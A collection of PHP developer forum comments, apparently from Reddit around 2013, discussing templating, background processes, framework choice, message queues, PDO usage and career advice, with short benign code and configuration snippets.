A very easy way to do this is by including the HTML in a PHP file within whatever method you're working on. Then in your HTML you have minimal PHP to controls what shows/hides. And since you're including it you have access to any variables you have created in that method. public function something() { if ("something"){ $x = 0 } else { $x = 1 } include_once 'yourhtml.php' } In yourhtml.php div div div &lt;?php if($x == 0){ display whatever div } ?&gt; div div div &lt;?php if($x == 1){ display whatever div } ?&gt; Just to keep things clean I would have those optional divs in their own .php files for include. You could also echo them out if they are really short or even break out of PHP if that's your jam. Try and familiarize yourself with some coding standards. [Zend](http://framework.zend.com/manual/1.12/en/coding-standard.html) is pretty standard but [WordPress](http://codex.wordpress.org/WordPress_Coding_Standards) has its own as well. They conflict alot but do your best. Don't get caught up in doing something perfect. There are alot of wrong ways to do something but alot of right ways as well. It's not math - there is more than one answer. I also suggest you look into using an IDE if you aren't already. PHPStorm is my flavor but any will work. This is an IDE, not just a text editor. It has tonnes more functionality. 
I agree, but if they don't like change they don't have to change. :)
So is separating the code simply for readability purposes? Does what I'm doing (displaying html from a php function) affect performance/security or is it just hideous and a pain to read? Thanks!
Instead of running hacks of cron jobs and nohup use http://supervisord.org/. 
A framework like Laravel or Symfony is good to start. Later you can use micro frameworks like Silex. Tip for the API: use HTTP response codes, things will be better later ;)
That's pretty cool. There are a few other options out there as well like upstart and monit. Do any of them really replace cron though if you need a job run at specific intervals and not permanently?
I would only recommend nohup type stuff when you are testing or running things once that take a long time. To get around those there are other things like screen/tmux. But it's hard to write about every single option out there and every possible solution :)
I've never used the nohup option, always used screen. Is there a way of seeing your output with nohup?
I've said it before, and I'll probably say it a few times more: I'm pretty much convinced that in the near future every single Open Source PHP project will have at least one or more Symfony components. Things like composer and PSR-0 are to thank for that, and this seems like a good evolution of that. ^((the notable exception to that is, of course, Wordpress)^)
tail -f nohup.out (default output location)
I can't believe they focused on the SQL injection, because I was still stumbling over the "he opened with a jape joke" part. Dafuq.
Sorry, am a bit slow ATM. Are you suggesting you can log the output without maintaining an active ssh session?
If you put a she-bang line into your script and make it executable, you can run it like any other script (e.g. `script.php`).
Even though there's plenty of time to refactor before beta, i doubt Magento 2 will change their "fake" namespaces. 
Instead of creating a new vhost container for every site, you can use the [vhost_alias](http://httpd.apache.org/docs/2.2/mod/mod_vhost_alias.html) module... &lt;VirtualHost *:80&gt; UseCanonicalName Off ServerAlias *.dev VirtualDocumentRoot /home/vagrant/vhosts/%-2+/web/ &lt;/Virtualhost&gt; This will serve up "http://example.dev" using ~/vhosts/example/web/ as the document root. So then you just have to make sure your hosts file (or local DNS server) is set to resolve the name properly. No need to touch apache after that, just create the directory that matches the hostname and drop your code in it. Also...many folks (myself included) will highly recommend [Vagrant](http://vagrantup.com) to quickly create a [VirtualBox](http://www.virtualbox.org)-powered VM as your local dev environment, as opposed to WAMP. And to properly get your virtual machine configured? [puphpet](https://puphpet.com/) of course!
I've been meaning to try out vagrant, thanks for the info!
Yes. When you run something with nohup it automatically logs everything to nohup.out. You can change that to whatever file you want or /dev/null if you don't want to fill a log file.
1) There's no absolutely bullet proof way to do this since it's a trusted client problem (how do you know the client is actually using your site and not just using the API directly). You could do things like checking referer headers and whatnot but those are easily spoofed. You could also use sessions which would give you the ability to rate limit at least per session ID. 2) Again a trusted client issue, so no, there's no way to ensure a "private API". The session ID requirement would force a bit of a hoop for the client to jump through but if your site is hitting an API endpoint it's super easy for anyone to find it (network inspector on any decent browser shows all ajax calls).
Not with that attitude...
I have some scripts that automatically clean up caches and stuff like that on install/update but haven't tried one for project create yet, but composer will allow you to run a script: { "scripts": { "post-create-project-cmd": "/usr/local/post-create.sh" } } You can ask for input from your script about what domain or any other strings
You sound like a FIG member. Is there any way to get the group itself to reach out to the Yii group? From an outsider perspective they seem really stubborn about the project and I'd really like to see them be a part of it, but I carry no weight at all. 
PHPStorm is written in Java; nearly everything in it is rendered non-native in Windows so that messed up these kinds of programs. 
When it comes to Wordpress, it's best to just strive for the best practices that you can and move on. The system itself is pretty limited. If it wasn't Wordpress, I would have written a data structure to handle the user with the picture and score. I also would not echo out anything outside of the template. So what I did is separated the HTML from the PHP. This makes it easier to distinguish things and also lets me avoid writing single quotes and makes it easier for the syntax highlighter to read. Then I wrote the get_user($args) into its own function and described what it did. I then noticed that the score and pic are dependent on each user, so I just did it all in one operation and updated the name of the function to be clearer. Then I changed the variable names to match the new format for users. I also added the "long hand" echo for compatibility, but would normally use &lt;?=?&gt; because it's always turned on after PHP 5.4. (I could write my "include" to read the file, replace "&lt;?=" with "&lt;?php echo ", and eval it which is common to do for template rendering) Then I just made club_progress() similar to how you see a controller method. I also reduced the algorithm for determining 3rd position. This is done by starting at zero, then before checking the modulus it will increment the number. This avoids the &gt;0 check. However, this is not complete because the logic for doing something when your amount of users ends at modulus zero will yield an empty row div. It could be solved by comparing $position to count($users) or something. This would be alleviated by introducing the User data structure with a custom iterator. &lt;?php function get_all_club_users() { $arguments = array( 'fields' =&gt; 'all_with_meta', ); $users = get_users($arguments); foreach($users as $key =&gt; $user) { $users[$key]['display_picture'] = get_user_pic($user); $users[$key]['score_percentage'] = (int) cc_manual_score_calc($user); } } function render_template($template_path, $variables) { ob_start(); extract($variables); include $template_path; return ob_get_flush(); } function club_progress() { $users = get_all_club_users(); echo render_template('templates/progress.php', compact('users')); } add_action('thesis_hook_after_container_club_progress_page', 'club_progress'); template: &lt;div class="row"&gt; &lt;?php $position = 0; foreach($users as $user): ?&gt; &lt;div class="col-md-4"&gt; &lt;div class="row"&gt; &lt;div class="col-xs-12"&gt; &lt;img class="img-circle" src="&lt;?php echo $user['display_picture']; ?&gt;" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;div class="col-xs-12"&gt; &lt;div class="progress progress-striped"&gt; &lt;div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: &lt;?php echo $cc_score; ?&gt;%;"&gt; &lt;div class="percent-indicator"&gt;&lt;?php echo $user['score_percentage']; ?&gt;%&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php if(++$position % 3 === 0): ?&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;?php endif; ?&gt; &lt;?php endforeach; ?&gt; &lt;/div&gt;
I'm not too familiar with WP-plugin development, but I'm sure you could write proper, modern code for it. I was talking about Wordpress itself. The code is old-fashioned, and from what i've read they're not even considering using namespaces anytime in the near future. This doesn't help: http://www.reddit.com/r/PHP/comments/1jvdnw/wordpress_finally_revamp_their_decade_old_core/
I've just finished building one at work and this presentation was very interesting: http://symfony.com/video/26/designing-http-interfaces-and-restful-web-services/English
I started writing Laravel Eloquent models for much of the Wordpress data structure so I could administrate it within my own admin - as a pet project - I have inadvertently written a package that handles most of the Wordpress database core; im looking to complete it and get it up on github before Christmas as I have found it useful in certain cases.
Do you edit your hosts file to point the new .dev each time? Is there a wildcard type solution for that?
Just to add (supervisord is a good suggestion): Your workers still need to be able to properly handle their own signals if you want to do it right. This is one of the things most people screw up with long-running processes - being able to shutdown gracefully mid-run when a [SIGTERM or SIGINT](http://en.wikipedia.org/wiki/Unix_signal) is sent. In iterative jobs this means that an iteration can be allowed to complete fully before exiting the script if the system asks for it to shut down. That said, this article is crap and it basically shows all the ways you should not spawn daemon processes. [Creating a proper daemon is a lot more involved than simply calling nohup](http://en.wikipedia.org/wiki/Daemon_\(computing\)).
What is the namespace of RGFormsModel? If none, try `... extends \RGFormsModel`.
Hi everyone. I'm the author of the library, and would appreciate any comment or feedback. Dispatch is somewhat a merging of a few nice things i've seen around in other micro-frameworks. It's very straightforward, has some documentation (that could do some improvement), and pretty useful for quickly creating small apps or APIs. It's yet another micro-framework, but I really enjoyed writing it and learned a lot from it.
We can't use the CodeSniffer PSR rules here at work (too irritating) - also ZF has refused to adopt them. Eh, once the next half dozen PSRs are finished we should probably fill in some PSR-1/2 blanks and fix this situation. At present, as far as I can tell, CodeSniffer's position is that they may interpret the rules for as long as PHP-FIG does not clarify them and they assert that they were told to do this by PHP-FIG. Never heard of a standards body giving adherents creative license instead of calling them out on non-compliance, but there you go. My disagreement is on record on the list.
Is Berlin close enough? http://berlin2013.live.symfony.com/en/index.html 
Don't use facebook connect.
It's much easier to background a process by using &amp; after the command instead of messing around with ctrl+z and jobs, ie: nohup php myscript.php &amp; Also, if you're worried about a script running long and you need to go home, but you need to continue to monitor the output, it would be wiser to run the script in a screen or tmux session to start with, so you can put the whole session into the background and resume it at a later point in time from another SSH session.
Are you joking? I thought it was pretty obvious I was just showing the syntax for something that would have been almost invariably more complicated. &lt;ul&gt; &lt;?php foreach($nav as $item){ ?&gt; &lt;li&gt;&lt;a href="&lt;?=$item-&gt;link?&gt;"&gt;&lt;?=$item-&gt;title?&gt;&lt;/a&gt;&lt;li&gt; &lt;?php }?&gt; &lt;/ul&gt; or &lt;table&gt; &lt;?php foreach($users as $user){ ?&gt; &lt;tr&gt; &lt;td&gt;&lt;a href="edituser.php?id=&lt;?=$user-&gt;id?&gt;"&gt;&lt;?=$user-&gt;name?&gt;&lt;/a&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$user-&gt;email?&gt;&lt;/td&gt; &lt;td&gt;&lt;?=$user-&gt;status?&gt;&lt;/td&gt; &lt;?php }?&gt; &lt;/table&gt; This is vastly more often the sort of thing you'd be doing with foreach. I hardly think "using the correct solution for a very common need" is **overusing**.
&gt; No classes, no namespaces. Just one file. Include it. Use it. Unfortunately this also means global functions and global state, some of which is hidden in function-level `static` vars. Suggestions: * Please, use namespaces. We've had them for years now, use them. Prevent naming clashes between libraries. * Avoid state if possible, manage it explicitly if not. Using an object gives you this. You create the object, it holds the state. You tear down the object, the state is removed. With functions that hold state, this becomes a mess you cannot clean up. And it means you have to cross a process boundary to test your code. * Looks *a lot* like a stripped-down [limonade](http://limonade-php.github.io/). And most of those issues are shared by limonade imo.
Looks interesting. However beside what /u/igorw mentioned, I have a real problem with these short function names: function u($str) function h($str, $flags = ENT_QUOTES, $enc = 'UTF-8') Please consider making these more readible in a future commit. Anyone maintaining code that uses this framework will look at it and go "da fuck dis do?".
for things such as html encoding and url generation, I actually prefer the 1 letter function variant. The rest is just noise in the code.
It's an Earth based ecology. Everytime you see a PHP developer lambast a framework because it's "slow", this is what he's talking about. A developer who knows about caching and server tuning/scaling is less inclined to complain about artificial benchmarks. Proper phrasing would likely be "front end oriented", i.e. more concerned with front end oriented optimisations such as faster code, more efficient UIs, etc.
PhraseExpress has some text paste options you can tinker with. Check Settings &gt; Expert options &gt; Paste method
I understand. However when you're a new developer coming to maintain a project, its much easier to understand a code's context when its more descriptive. That way you're not always referring back to the documentation or API. On a small framework like this it wouldn't show itself as being prudent, but if this scales up or on larger frameworks, the impact would be much more noticeable.
Why would params() serve to collate query &amp; post params together? I see them as separate entities but I know I've seen other frameworks do this as well.
I don't think anyone here cares about user group drama, nor are we the sensationalist feminists that's found in Ruby and Python groups.
Thanks!
&gt; I feel like I waste so much time developing things I developed before with little difference. Yeah...This. Honestly, the truth is that your two sliders are different, therefore you will need different things to address them. IF you're making small scale sites, which it sounds like you are, checkout [Jeffrey Way's Generators](https://github.com/JeffreyWay/Laravel-4-Generators). I honestly ripped out the generator code a while ago and wrote my own custom version, but for basic projects, his solution is excellent. Probably the best cure for boilerplate headache in Laravel, and it looks like that's what you need.
Seems like a rewrite of the docs, but nice job.
It does cover many things stated in the docs; but the listings are concrete implementations of a real system. If you follow this tutorial, from start to finish, you will need no further examples or documentation to be able to build authenticated applications with Laravel 4. The same cannot be said of the docs, unfortunately. :/ Edit: The docs are good, I don't mean to imply that they aren't. It might also be possible to do a lot of the code in the tutorial without leaving the docs, but the tutorial ties together a lot of different things; like blade, migrations, action flow etc. in a way the docs do not.
Hi, Looks quite nice. I may steal some features to my own micro-framework (https://github.com/bungle/web.php). I personally like coding PHP with simple functions (less OOP the better). Some argued that you should use namespaces. Well, I don't know. Less code, less to write, less to read (and even PHP follows simple functions approach on most of the things, all defined on global namespace, even Linux kernel is fine with that). This is micro-framework after all. Someone gave a warning about using global state or static vars in functions. Whatever, PHP still flushes everything after a request. Not a big deal. If you like it, and you are the one who chooses the tools (for personal projects or for a small team), don't listen to what others say (if the message is not constructive). Everyone has their personal style. Even carpenters build their own tools. I kinda like what you have done, thanks for posting.
In terms of API design, /u/philsturgeon's blog post on the topic is pretty good: http://philsturgeon.co.uk/blog/2013/07/building-a-decent-api
Thanks for the suggestions, igorw. On big projects, I personally use either FuelPHP or Symfony2. When I started this, I was looking for something that's both straightforward and quick to write. I really liked sinatra so I opted to use the same approach. For this, I went with not using namespaces. I didn't go with objects for keeping states since the things that I need to persist per request needed to behave like singletons anyway (configurations, routes, template variables). I understand that the choices made are bad choices compared to best practices, but they were consciously made in favor of simplicity and convenience.
I agree with what you're saying in this comment, but your wording in the article says something totally different. Could you edit your article to make the same point there that you're making here?
I would have to agree with you on the performance point. Although there are a lot of things you can do to improve your application performance, the architecture of the platform running your application will cast a large shadow over most of the small performance tweaks in the framework. One of the exceptions I can think of would be caching, which most respected frameworks supply anyways. Edit: I should clarify, I'm talking about decisions like teams deciding against using ORM's because of the performance decrease. I believe that things such as lower development time and code maintainability outweigh any kind of performance gain you achieve by not using an ORM.
Yes, the behavior of params() is based on how other frameworks do it. During collation, url params override post vars override get params. My thinking then was that if you needed get or post params, you can always just get them from $_GET and $_POST respectively.
I would if it were my article ;)
Being another voting member (Zend Framework), I also don't see anything preventing Yii from applying. The application process is really simple (send email), Phil has offered to sponsor, and I can think of no reason why I'd vote against them. Yii itself may have its reasons for not applying.
It goes back to separating your output from your logic. And honestly, it's easier to use includes. You never have to break out of PHP or deal with multiple quotes. There are lots of programming methodologies out there but starting out it might be good to focus on narrowing the scope of your classes and methods. Especially methods. Say you need to retrieve a piece of data, check it for something, and then output something. You could totally do that in one method but try and break it out. One to get the data, one to check the data, and one to display the data. I know nothing of performance but I know it makes your life easier as a developer. It makes tracking bugs, updating, and refactoring alot easier.
Similar to what /u/dabruc commented, it's difficult to do. Anything on the client side is going to be accessible and public by the sheer nature of things. Your best bet might be to look at different auth techniques and go from there.
Its just so strange since I can launch Launchy completely fine but with these other programs I cant
Thanks bungle. I am in the same mindset. Also I understand that good programming practices are important, and this is what their comments are emphasizing. But sometimes I just want something really quick to use without much setup code to get something done quickly, especially for small apps or poc stuff. If you find useful stuff, please pull them out. I've basically done just the same from different frameworks. I learned a lot from the other frameworks.
Its not the spell checker is it?
It happens every so often for me for docblocks. Killing the ending `/`, saving, then re-adding the ending `/` for the block fixes it. Try breaking the code hard, saving, then fixing and saving again.
"Symfony Sverige" has pretty much a meetup every week in Stockholm: http://www.meetup.com/symfony-se/
I don't like nesting HTML in PHP in HTML in PHP ... at all, it quickly makes a mess of things. It works for small snippets, but in more complex situations it can quickly become spaghetti. A hard to read warren of &lt;?php tags that will eventually be not or wrongly closed. I find it much better to, if you have to write HTML yourself (see my other reply), to keep everything non-PHP in a string. &lt;?php echo '&lt;ul class="users"&gt;' . PHP_EOL; foreach ($users as $user) { echo '&lt;li&gt;' . $user . '&lt;/li&gt;' . PHP_EOL; } echo '&lt;/ul&gt;' . PHP_EOL; ?&gt; 
No, if I'm adding a concatenated string for example, when I'm halfway through it, obviously the second period and quote aren't in there yet, so it's all like "wrong!", but then when I finish, the damn squiggles don't go away. Irritating.
or you could use a templating system like laravel blade or smarty to make this process a bit better.
Damn, sorry :( It's almost like it's saying this, huh? http://i.imgur.com/vItJ3hu.png
More like this: http://i.imgur.com/DvHmFs1.png
Pretty sure if you've managed to access /tmp on PayPal's app server, you don't need a SOAP exploit to cause damage at that point. 
Cloudbase [Pusher](http://pusher.com)
Along this same lines, anybody have any suggestions for a pub/sub that supports publishing times. EG: I add something to the bus at time A, but don't want the bus to push to the subscribers until time B.
I can't seem to find any project based documentation on the website. Lots of standard small examples and stuff but no overarching project. Is there something I'm missing?
Don't try and jam that class into a namespace, just include it (or classmap it in your composer.json) and reference it as you would any other global class. Let global code be global code.
Microsoft Azure service bus queues support delayed execution
For messaging, ZeroMQ is awesome. For queuing, I've had great luck with the PHP fork of Resque.
I really liked RabbitMQ when I used it.
Out of pure curiosity, why don't you like smarty?
This is a sideline reply chiming in on a tangent, since others have properly addressed your question, however, I just wanted to bring up the Chicago Tribune WordPress/MTV project (models, templates, view.) Their writeup is here: http://blog.apps.chicagotribune.com/2011/08/05/mtv-models-templates-views-in-wordpress/ It didn't get the best of reviews (see comments at http://blog.apps.chicagotribune.com/2011/10/19/turning-wordpress-into-a-framework-with-mtv/ and https://news.ycombinator.com/item?id=3131248) -- but at least someone attempted it. Think the core issue here is the maintenance overhead. Idea was to separate programming from HTML/templates so designers can focus on their craft more directly. However, the project went against the WP grain; for example, for every plugin that's installed, they had to write additional hooks for the template. This basically meant that you had to go back to the programming level for template work, and WP updates.
I think a better point would be "Not every PHP developer has the option to make sure that their server infrastructure has the right PHP setup (PHP-FPM, an opcache, maybe memcache) and so when they look at frameworks and framework performance on "PHP+CGI" they say "screw this noise, I'm going to write single-purpose scripts that handle the minimum request/response cycle and don't use that silly ORM/DBAL stuff; I don't have cacheing anyway" More and more, given environments not designed for PHP speed, I find myself in the "Frameworks are for chumps" crowd. 
Not bad, I don't agree with using the Input::server("REQUEST_METHOD") stuff though when you could route the get and post requests to separate actions using Route::get and Route::post, and you could refactor a lot of code out of the post action into some domain layer classes. The validation for example could easily be extracted into a LoginForm class that you populate with Input::all() and then check if $loginForm-&gt;isValid() rather than storing all of the validation rules directly in the controller.
yeah, not gonna blame you. they just wanted to show you, what's possible with the templating syntax. what you really do is, you do all the auth::check() stuff in your models or controllers and then just give variables like $username to the view. in the view iteself, you can do this: &lt;div&gt;Username: {{ $username }}&lt;/div&gt; and maybe sometimes, you need a loop to go through a list of items @foreach($list as $item) &lt;div&gt;Listitem: {{ $item }}&lt;/div&gt; @endforeach which is a lot more readable than "&lt;?php ?&gt;" solutions. i really like the absense of curly braces in the conditions and loops. edit: you can always use the &lt;?php tags in the laravel blade templates
Very nice article!
My favourite too. It plays nicely with most operating systems, not needing dozens of dependencies.
Not really for anything specific, I just wanted to find the article I was talking about. I was having a chat with a friend at work and this came up, so I'm trying to find the source.
And can anything be pushed to run client side? My question was actually if you run into the mentioned article before, I was looking to reference it to a friend.
AFAIK no e-mail client (including gmail and hotmail) will allow you to run any sort of scripting. So pretty much all you can get from php is remote ip and user agent.
Gearman is a distributed work queue. It can be *used* for messaging, but being a work queue is the original intended purpose. I personally think it's the bee's knees. 
Why didnt you link to the github?
Am I missing something? The article is completely blank.
It's blank until runtime. https://github.com/daylerees/dependency-injection-example
I'm a fan of SQS, too. Outsource your infrastructure. 
Well, you definitely caught me at that price point. Although now I wish I could have it right now! :P But time flies so, I'll take it.
Awesome, thanks! Working on the book tonight. I'll be releasing chapters to pre-order customers as I finish them.
Is anyone using Apache's Active MQ? Any experiences, comments?
RabbitMQ supports queues that can route back to another queue when the time expires, but the time is per queue not per message if that's of some use.
wasn't .18 release a couple of days ago? I got stuck on .16 because they broke mssql pdo connector on .17 and I only realise it too late so I manually had to downgrade. Damn PHP get your shit together. Maybe increase the staging time so this bugs can be caught before the public release? 
&gt; 5-10 $_SESSION variables Who says you need more? &gt; "user timezone", "user ID", etc. It all can be written to 1 group - "user" (and maybe secondary one, "profile" or smth like that).
I know that. I'm asking what your mid-to-large project $_SESSION variables would be. Multi-dimensional included as single variables. I don't care what a min or max would be. Lazy programmers use more $_SESSION variables in most cases. EDIT: This is a question of practicality, not of "I M NOOB, R SERVR VARIABLES TEH DEVIL?LOLLLLL".
Hi Enerb. Thanks for responding but thats not the point here. I cant choose a framework. I am taking over an existing project.
Hi Timdev. Thanks for replying. Thanks for the info you've given me, knowing its not a good idea to go to Zend 2 is useful to know as the owners are pushing for that in the hopes of 'being up to date'. Enjoy your drinks, its too early in the morning here for a drink. 
Zend is very "unmagical". It's really just a big pile of classes that happen to work together nicely. But it was always designed so that things like Zend_Cache, or Zend_Mail could be used independently. This is a good thing, but it means you have to do some more work. &gt; Does Zend have a facility like Codeigniters Profiler and Active Record? I don't know what the CI Profiler does. But more importantly, Zend is really a "VC" framework (there is no "M", that's your job). This is also a good thing. Don't think about moving from ZF1-&gt;ZF2 for a good long while. Especially if you're coming from CodeIgniter and don't have a problem with Class_Names_Like_This. ZF2 is far superior to ZF1 -- to the point that it's a totally different animal. I wouldn't start a new project in ZF1, but you should feel fine maintaining a ZF1 project indefinitely.
Just bought and read through Scaling PHP. Finally a good organized resource all in one place. Any similar ebooks or sites along the same lines or other considerations you would suggest?
The main things are clientid, staffid, and csrf token, everything else is fetched from a cached doctrine entity (Staff or User) 
&gt;knowing its not a good idea to go to Zend 2 is useful to know as the owners are pushing for that in the hopes of 'being up to date' What did he say?
They know they are on zend 1 and they know there is Zend 2 and they think they are behind and vulnerable in some way. 
Well it may be, but thats part of my work: To listen to the customer and do what they need if its responsible, practical and cost effective to do it. The point of my post is to ask what differences will I come up against in taking on a Zend application coming from a Codeigniter background in developer terms. 
Check the edit, bro. Your message came across as if the poster claimed that ZF (1 &amp; 2) were behind the flow in comparison with other frameworks and also containing security vulnerabilities, rather than the owners wanting to upgrade from ZF1 to ZF2 because they believe the former to be obsolete. In short, we've been talking past each-other. 
Slight self-promotion perhaps, since I'm the author, but you might want to look into Wave Framework (www.waveframework.com). I'm an API-centric development evangelist and this was something I came up with as part of my Masters thesis early last year. This is a post-RESTful framework, meaning that while it is usable over HTTP easily, it is entirely dynamic and parameter-driven. It also has things like dynamic image loader and other neat features for building Web services and websites with. If you have any questions, then I am always ready to help and answer both here or through email :) 
I think you should put some chapter excerpts. That's what stops me from buying it. Have to figure out if the amount of info will worth the price tag...something like Amazon search inside... Thanks!
Bootstrapping is a big subject with ZF. Be sure to review all of the Bootstrap.php files. 
Nope - there's a still a lot of work to be done creating tutorials for projects. Look out for more official stuff coming soon...
As soon as I have a sample chapter that represents what the book entails, I will post it. Right now I just have the intro and overview written, which isn't exactly a compelling reason as to why you should buy the book. However, follow me on Twitter (@leftnode) or subscribe to the newsletter there and you'll be notified of updates. Thanks!
Depends on how you are contracted to take over a project. I took over a project about a half year ago, and got complete freedom in maintaining. Did some refactoring, swapping out the zend_lucene and zend_routing stuff for a symfony2 based router, hooked in doctrine1 and just kept the zend_forms because they where nested way to deep in spaghetti class overloading. This was a mid size project, about 200 pages with 20 forms, and a payment gateway. 
Beanstalkd is very easy to setup and use via the Pheanstalk library. There is also a web UI for Beanstalkd available on Github (Beanstalkd Console).
You can easily use doctrine2 with zf2. Actually it's really cool:)
I usually just store user_id and the previous csrf token and at times a captcha result.
Yeah, the $19 price point is a very sweet spot for a pre-order. Pre-ordered. Can't wait for the release!
http://www.phptherightway.com/ http://fabien.potencier.org/article/50/create-your-own-framework-on-top-of-the-symfony2-components-part-1
Just going to leave this link here: https://github.com/domnikl/DesignPatternsPHP Might be useful for you.
Senior Developer will interface with management. Possibly also with the customer. Decisions you make will either cost you or your company a lot of money, or make you or your company a lot of money. People will get or lose jobs based on your opinions. Take on a side project where you interface with the client yourself directly. Estimate your time and scope for the project. The aim is to be able to work through the project in your head, and project where it will go, what will be involved, what will happen, and make that prediction. From a technical side, senior means top dog. Meaning you are the stop gap. You don't necessarily get to walk into the other room and get help with something, you are the final say, that carries with it both the perks and responsibilities. Design patterns will help you make better projections, will help you better understand the scope of potential projects, but it is entirely up to the avenue of work you get into. You should be able to know yourself. Know your limits and abilities, and be able to get yourself out of any situation that may arise. Troubleshooting is key here, how to break down problems, know when to micromanage and when to step back and look at the big picture. You should be able to explain the differences between codeigniter and yii, any anything else your line of work brings up. Explain the pros and cons of each, and be able to simply explain why choice A is better than choice B. That said, still be able to work through with either. Being senior dev is kind of like being Rambo. You are dropped into the shit, you might have backup, you might not, you might have weapons, you might not, you might fight alone, you might not, but whatever the situation is, you are dependable and effective at executing your objective. That said, 3 years of experience with 2 frameworks isn't senior level, its Entry or Jr at best. The kind of shit you are talking about, being the highest level technical development position without any customer/management/business interaction would be a mid-range developer. Basically the same as Senior but without nearly the responsibilities.
I didn't claim I was a senior developer, in fact I did the opposite. However, I currently I lead two other developers on a project, I have weekly talks with the client, make high level decisions and manage the project. I may be on the right track then from this standpoint. This isn't exactly what I was asking about though. I'm mainly interested about what technical skills I should possess. 
I would recommend reading [Patterns of Enterprise Application Architecture] ( http://www.amazon.com/gp/aw/d/0321127420/ref=mp_s_a_1_1?qid=1377370166&amp;sr=8-1&amp;pi=AC_SX110_SY165). It contains a lot of framework level design patterns. While you're there you could grab my book [PHP Array Filtering, The Use Cases]( http://www.amazon.com/PHP-Array-Filtering-ebook/dp/B00CYGY5GS/ref=pd_rhf_se_p_t_2_C1EP) ;-)
He's asking what Timdev said as he deleted his post.
Sorry, I thought you were referring to the customer. I didn't see the response was deleted at the time. 
S.O.L.I.D. principles
Imo good replacement for gang of four book would be this http://www.amazon.com/Objects-Patterns-Practice-Experts-Source/dp/143022925X To be honest i don't think there is much depth into PHP itself. If you want to become a better programmer you should pick up other languages preferably fundamentally different from PHP. It will change your preception of problems/solutions and the way you program in your main language.
Imho any PDO tutorial that does not set ERRMODE_EXCEPTION is pretty worthless (esp for beginners). That's the most important thing you *need* to do when using PDO...
Systems administration. It's the logical next best thing to know.
&gt;The ones I looked into (Gang of four, Head first Design patterns) seemed too Java biased and I couldn't see how I could use these with PHP development. If you can't see how the ideas are portable, you're already losing the fight. The language is just there to illustrate the concepts. It isn't there to be the concept. Many of the best books on programming will use languages which aren't php. Not getting past this prejudice will keep you stagnant.
&gt;That said, 3 years of experience with 2 frameworks isn't senior level, its Entry or Jr at best You kind of sound like one those companies who tries to hire an entry level developers with shit pay and 3 years of experience required. 
I'm curious about the costs of getting to that level of technical ability. Sounds to me like there's a huge opportunity cost in being that good: that familar with the language and ecosystem. If you put so much of your lifes energy into learning PHP/programming, to the point where you get that good, what do you miss out on? 
What happens if you echo $row['post_id'] are you getting the right value then?
on the second page it doesn't elicit a response at all
it is 
Sorry, on the first page does it show the right value?
The technical skills you should posses are the ones that you gonna need for future projects, but since those are hard to predict, the best skill to possess is the knowledge that gives you the capacity to make choices and learn quickly specific things to solve problems and achieve success. In other words, instead of spending time training, acquiring knowledge and experience in specific things such as X,Y, or Z framework or tool that you may never come to use, you should look at your work from a bigger perspective. Learn to know what tools, techniques, design patterns, best practices you have available, what you can achieve with them, which one is the best for what, and gather enough knowledge to make decisions and to be ready to consult the manuals and quick learn the details and use them when you need. What made me get to my current position as Development Director, was not learning PHP when I got a book, RoR when it became a trend, or Laravel when it got famous, or Java because somebody said it will be the future... It was an everyday learning, reading, updating my knowledge about what is out there that I can use or I may need, avoiding to spend time getting to specific when I don't yet need to use it. So, I guess the previous reply was a valid and valuable in many aspects... as it can give you an idea about the next levels, even when in the end the OP was kind of measuring your position, but I don't think he was trying to bash you or anything. Anyway he toke his time to pass you some opinion/knowledge that you should appreciate instead of getting defensive for what you could perceive as a judgement. Remember... sometimes the best answers are not the ones you are expecting. And with this post, all you can get is opinions. There's no such thing as "the answer". 
phptherightway.com , must read for every PHP dev, not because its the answer, but because it's steps in the right direction for long term best practices and easy avoidance of silly pitfalls.
composer and some of the technologies like sphinx, memcache, redis, gearman
i think its very different depending on country, "senior developer" here here in germany really just means you're (a lot) more experienced, you still usually only interface with the same people as the juniors which usually is the scrum master and maybe a productmanager . (sidenode: it also could mean "management" means something different, as from my PoV in a company of 100 people theres usually only 5 people or so that are "management") (of course this all excludes startups where literary everyone still knows everyone)
&lt;?php session_start(); $_SESSION['post'] = 'test me'; echo 'The value stored in the session is: ' . $_SESSION['post']; ?&gt; If you are new to sessions and just trying to learn them start out with a constant value not a database driven value. If $row['post_id'] doesn't have a value then the problem isn't with the session but instead it's with the null value you're storing in it. if session_start(); is above all of your other code then please upload it to pastebin or something so we can take a better look.
My point was that 3 years of experience and knowing a framework or two is not entry level.
Switch to Laravel from Codeigniter, it's much more modern and Ellislab is looking to stop developing Codeigniter.
And your initial connection should be wrapped in a try/catch block since a failed connection results in an exception. 
the $row['post_id'] has a value but doesn't transfer to the next page that I want it on. It shows on the first page, but always shows the value of 1 on the second page. 
&gt; session_start(); &gt; $_SESSION['post'] = 'test me'; &gt; echo 'The value stored in the session is: ' . $_SESSION['post']; that works, but I'm trying to call the value stored in post on another page
Also, the initialization flag that sets utf8 encoding and the one that turns off emulated prepared statements. 
Alright so make sure you are using the same Web browser, and copy that same code at the top of the second page except get rid of the line that sets the variable and it should print out "test me". If it doesn't work make sure you check for spelling errors on the variable you are printing out. In my example it's just called post not post_id
will check it out later on.. preparing for my daughters birthday party
You could say the same about any career. Want to be a good doctor, lawyer, surgeon? It takes time to learn. You miss out on stuff, BUT coders are a curious beast at the best of times. The best coders are often the ones who are sat coding for FUN, long before they ever get a job as a coder
Don't know why you're being downvoted. Memcache/Redis are skills a good PHP developer should have. Sphinx and Gearman are a bit more niche I think. I'd also add some form of database expertise (MySQL, Postgres etc). A lot of people who claim they are good PHP *developers* are actually woeful at database and sql, yet they are quite co-dependant skills.
Nothing wrong with a PHP developer learning a new language on the side. Pick a hard one (C++ or something) and even if you don't ever master it, it'll make you a better PHP developer. 
You win this thread.
this https://gist.github.com/reusee/1035975
&gt; Signed, A Sr. Software Architect at a Fortune 50 software company that makes a lot more than the people who will downvote him for saying this. You are coming across as a little conceited, but I don't disagree with what you wrote regarding ideological fanaticism. 
A real programming language. *hides*
Then fork and make a pull-request?
Source on that? 
It will still likely live on for a while though.
Sure, I fully get that. However I just don't feel that is what the project wants. Lots of projects do this - coders are so familiar with the patterns they use that no explanation is needed. I'll raise ut as a ticket and see what the general feeling is before trying to push anything forwards. 
&gt; live It's been in coma for few years already, there's no coming back :)
